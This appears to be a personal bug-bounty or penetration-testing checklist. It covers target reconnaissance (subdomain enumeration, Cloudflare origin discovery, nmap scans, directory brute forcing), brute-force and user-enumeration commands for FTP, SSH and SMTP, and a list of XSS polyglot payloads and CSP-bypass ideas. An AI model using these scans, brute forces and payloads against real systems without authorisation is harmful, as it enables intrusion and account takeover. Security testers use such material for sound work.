A Small Set of Customized Tools for Merry Making

Steps:

* Discovery / Mapping:
  * Linked Resources:
    * Find inscope domains with enum-domains
      * Try to eliminate cloudflare:
        * Use enum-domains `csv` list for non-cloudflair ips
        * historical lookup: http://toolbar.netcraft.com/site_report?url=example.com
        * dig: `dig ANY example.com`
        * get them to send an email & check headers
        * https://rhinosecuritylabs.com/cloud-security/cloudflare-bypassing-cloud-security/
        * Signup & look at email headers for ip
      * Reverse IP lookup: https://github.com/darkoperator/dnsrecon
        * haven't tried ^ yet
    * via: virustotal => `https://virustotal.com/en/domain/<domain>/information/`
      * Observed subdomains
    * via: similarweb
    * Scan subdomains for popular services / plugins
      * curl subdomain, then cat response & grep for service strings
        * eg: facebook, wordpress, surveygizmo, aws, shopify, unbounce, fastly, heroku, github, desk, tumblr
      * Save so that you can go back historically if you find vulns
      * TODO: write that tool
    * nmap scans:
      * Port scan: `nmap -sS -A -PN -p- --script=http-title example.com`
        * `nmap-domains/scan.sh` for going through .lst
      * DNS brute force: `nmap --script=dns* example.com`
      * Host search: `nmap -p 80 --script=hostmap* example.com`
  * Unlinked Resources:
    * `dir-buster` to brute force
      * use seclists to augment:
        * RAFT lists
        * Git digger
        * svn digger
    * Try spidering deeper:
```
acme.com - 200
acme.com/backlog/ - 404
acme.com/controlpanel/ - 401 <-- dig deeper
acme.com/controlpanel/[bruteforce here now]
```
  * Tech stack -- check for CVEs against results here:
    * Wappalyzer (chrome)
    * Builtwith (chrome)
    * [retire.js](https://retirejs.github.io/retire.js/)
  * Custom engines
    * [WPScan](https://wpscan.org/)
      * plugins are more insecure than the platform!
    * [CMSmap](https://github.com/Dionach/CMSmap)
  * OSINT:
    * Use past flaws to pivot into new flaws
      * xssed.com
      * reddit xss
      * punkspider
      * xss.cx
      * xssposed.org
      * twitter search
  * SWFs search:
    * Google dorks: `site:url.com ext:swf`
  * Login w/ Facebook connect
    * look for `redirect_uri` & open redirects
      * Links to learn, I don't understand open redirect:
        * want to get tokens / access tokens
        * http://homakov.blogspot.se/2013/02/hacking-facebook-with-oauth2-and-chrome.html 
        * http://www.breaksec.com/?p=6039 Facebook Connect
  * 3rd Party Scripts
    * look for url downloads in scripts
      * are there url query parameters used in scripts?
    * `(get)?(query|url|qs|hash)param`
    * `location\.(hash|href|search)\.match`
    * bypass Content Security Policy
      * Look at CSP domains, use those as attack vector
      * eg: `<script src="mixpanel.com?callback=alert(1)">`

# Attacking Services:

### FTP:

* FTP-Brute: `nmap --script=ftp* -p 21 target.com`

### SSH:

* SSH-Brute: `nmap --script=ssh* -p 22 target.com`

### SMTP:

* Enum users: `nmap –script=smtp-enum-users target.com`
* http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

### EPMD (aka rabbbitmq):

* `nmap -p 4369 --script epmd-info <target>`

# Attacking Websites

### User Enumeration / Authentication

* Try to chain attacks in auth:
  * reset password + brute force tokens
* Timing Attack: Try to register / reset password / etc
  * Time how long it takes for known success vs known failed
  * Ref: http://cwe.mitre.org/data/definitions/208

### Brute Force

* TFA backup codes
* TFA codes
* Password reset tokens

### XSS

* polyglot payloads:
  * `<PLAINTEXT>`
  * `"><img src=x onerror=confirm(1);>`
  * ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
  * `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
  * `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">`
* 3rd party vectors:
  * facebook login, google login, etc.
* dynamic anchor tags in url: `http://example.com#<xss-here>`
* in redirects
* js embedded in swf
* XSS'd username + password reset

# Tools to investigate

* https://intrigue.io/
